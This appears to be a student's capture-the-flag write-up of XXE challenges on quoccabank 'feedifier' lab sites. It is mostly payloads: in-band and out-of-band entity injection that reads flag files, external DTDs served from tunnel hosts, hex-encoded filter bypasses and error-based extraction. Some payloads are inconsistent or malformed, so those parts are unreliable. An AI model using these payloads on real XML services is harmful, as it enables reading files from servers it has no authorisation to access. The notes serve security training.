## v1.feedifier.quoccabank.com

Used pastebin raw paste - https://pastebin.com/RyQepthP

In-band basic xxe payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM 'file:///flag_64b3ebd165d9508735bc8a29ddebb285'> ]>
<rss> <channel>
<item> <description>1</description> <link>1</link> <title>&xxe;</title>
</item> </channel> </rss>
```

## v2.feedifier.quoccabank.com (TBD) 
Used pastebin + locally hosted url (since I wanted http)

Out-band xxe payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
  <!ENTITY % dtd SYSTEM "http://strong-gecko-39.loca.lt/feedifierv2.txt">
  %dtd;
]>
<rss>
<channel>
	<item>
		<description>1</description>
		<link> 1</link>
		<title>&inject;</title>
	</item>
</channel>
</rss>
```

And at http://strong-gecko-39.loca.lt/feedifierv2.txt
```xml
<!ENTITY inject SYSTEM "file:///flag_0054c423ef634e00b4a586f4142e7522">
```


# v3.feedifier.quoccabank.com
1. Here, the sanitiser was checking keywords in my secondary file. (probably a regex matching). 
So, to bypass this, you can try using hex encodings (Eg; f is 0x66)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://warm-panther-32.loca.lt/payload3.txt">
  %dtd;
  %comb;
]>
<rss>
<channel>
	<item>
		<description>1;</description>
		<link> 1;</link>
		<title>&inject;</title>
	</item>
</channel>
</rss>
```xml

At http://strong-gecko-39.loca.lt/feedifierv2.txt:
```xml
<!ENTITY % comb "<!ENTITY inject SYSTEM '&#x66;ile:///&#x66;lag_d9cd6fcd14d4597712c583d5fc1e5362'>">
```


2. Alternative method: Error based XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://warm-panther-32.loca.lt/payload3.txt">
  %dtd;
]>
<rss>
<channel>
	<item>
		<description>1</description>
		<link>1</link>
		<title>&dtd;</title>
	</item>
</channel>
</rss>
```


And at http://warm-panther-32.loca.lt/payload3.txt:
```xml
<!ENTITY % first "fi">
<!ENTITY % second "le:////fl">
<!ENTITY % third "ag_d9cd6fcd14d4597712c583d5fc1e5362">

<!ENTITY % dummy1 "<!ENTITY &#x25; trick SYSTEM '/%first%second%third;'>">

%dummy1         --->  resolved into <!ENTITY % trick SYSTEM 'file:///flag_{...}'>

<!ENTITY % dummy2 "<!ENTITY &#x25; error SYSTEM '/%trick;'>">

%dummy2         --> puts an invalid flag/flag/{...} file

%error 
```

# v3.feedifier.quoccabank.com
1. Overwrite a dtd defintion from docbook. Note: only the first definition is used and rest are ignored.
You need to find a paramterised definition which is also executed in the docbook

Error based extraction:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % importDocbook SYSTEM "file:///usr/share/sgml/docbook/dtd/4.5/docbookx.dtd">
  <!ENTITY % ISOamso '<!ENTITY &#37; flag SYSTEM "file:///flag{...}">'>
  <!ENTITY &#37; win "<!ENTITY &#38;#37; newvar SYSTEM "flag;">'>

  %importDocbook;
  %win;
]>
<rss>
<channel>
	<item>
		<description>1</description>
		<link>1</link>
		<title>&dtd;</title>
	</item>
</channel>
</rss>
```

# letters.quoccabank.com (TBD)

# signin (TBD)

# wallet.quoccabank.com

